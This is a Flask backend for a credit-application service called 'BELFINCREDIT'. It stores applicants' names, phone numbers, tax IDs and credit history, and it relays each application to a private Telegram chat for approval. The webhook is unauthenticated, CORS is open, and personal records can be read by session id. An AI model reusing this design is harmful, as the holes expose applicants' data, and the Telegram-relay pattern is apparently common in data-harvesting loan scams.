import os
import sqlite3
import secrets
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "0"))
DB_PATH = os.environ.get("DB_PATH", "applications.db")

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS applications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            fullname TEXT,
            phone TEXT,
            inn TEXT,
            income REAL,
            term INTEGER,
            amount REAL,
            payment REAL,
            session_id TEXT UNIQUE,
            credit_history TEXT,
            status TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()

init_db()

def db_one(query, params=()):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(query, params)
    row = c.fetchone()
    conn.close()
    return row

def db_exec(query, params=()):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(query, params)
    conn.commit()
    conn.close()

def send_to_admin(text, keyboard=None):
    if not BOT_TOKEN or not ADMIN_CHAT_ID:
        print("Telegram is not configured")
        print(text)
        return

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": ADMIN_CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    }

    if keyboard:
        payload["reply_markup"] = keyboard

    requests.post(url, json=payload, timeout=15)

def answer_callback(callback_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    requests.post(url, json={"callback_query_id": callback_id, "text": text}, timeout=15)

def keyboard(session_id):
    return {
        "inline_keyboard": [
            [{"text": "✅ Одобрить", "callback_data": f"approve:{session_id}"}],
            [{"text": "❌ Отклонить", "callback_data": f"reject:{session_id}"}]
        ]
    }

@app.route("/")
def home():
    return "✅ BELFINCREDIT API работает"

@app.route("/submit_credit_application", methods=["POST"])
def submit_credit_application():
    data = request.get_json(force=True) or {}

    session_id = secrets.token_hex(12)

    fullname = str(data.get("fullname", "")).strip()
    phone = str(data.get("phone", "")).strip()
    inn = str(data.get("inn", "")).strip()
    term = int(data.get("term", 0))
    amount = float(data.get("amount", 0))
    payment = float(data.get("payment", 0))
    credit_history = str(data.get("credit_history", "")).strip()

    db_exec("""
        INSERT INTO applications
        (fullname, phone, inn, income, term, amount, payment, session_id, credit_history, status)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (fullname, phone, inn, 0, term, amount, payment, session_id, credit_history, "pending"))

    msg = f"""🆕 <b>НОВАЯ ЗАЯВКА</b>

👤 <b>ФИО:</b> {fullname}
📱 <b>Телефон:</b> {phone}
🆔 <b>ИНН:</b> {inn}
💰 <b>Сумма:</b> {amount:.0f} BYN
📅 <b>Срок:</b> {term} мес.
💳 <b>Платёж:</b> ~{payment:.0f} BYN
📊 <b>КИ:</b> {credit_history}

🆔 <b>Сессия:</b> <code>{session_id}</code>"""

    send_to_admin(msg, keyboard(session_id))

    return jsonify({"status": "ok", "session_id": session_id})

@app.route("/check_status/<session_id>")
def check_status(session_id):
    row = db_one("SELECT status FROM applications WHERE session_id = ?", (session_id,))
    if not row:
        return jsonify({"status": "not_found"}), 404

    return jsonify({"status": row[0]})

@app.route("/get_application/<session_id>")
def get_application(session_id):
    row = db_one("""
        SELECT fullname, phone, inn, amount, term, payment, credit_history, status
        FROM applications
        WHERE session_id = ?
    """, (session_id,))

    if not row:
        return jsonify({"status": "not_found"}), 404

    return jsonify({
        "fullname": row[0],
        "phone": row[1],
        "inn": row[2],
        "amount": row[3],
        "term": row[4],
        "payment": row[5],
        "credit_history": row[6],
        "status": row[7]
    })

@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.get_json(force=True) or {}
    callback = data.get("callback_query")

    if not callback:
        return jsonify({"status": "ok"})

    callback_id = callback.get("id")
    callback_data = callback.get("data", "")

    if callback_data.startswith("approve:"):
        session_id = callback_data.split(":", 1)[1]
        db_exec("UPDATE applications SET status = ? WHERE session_id = ?", ("approved", session_id))
        answer_callback(callback_id, "✅ Заявка одобрена")
        send_to_admin(f"✅ <b>Заявка одобрена</b>\nСессия: <code>{session_id}</code>")

    elif callback_data.startswith("reject:"):
        session_id = callback_data.split(":", 1)[1]
        db_exec("UPDATE applications SET status = ? WHERE session_id = ?", ("rejected", session_id))
        answer_callback(callback_id, "❌ Заявка отклонена")
        send_to_admin(f"❌ <b>Заявка отклонена</b>\nСессия: <code>{session_id}</code>")

    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    app.run(host="0.0.0.0", port=port)
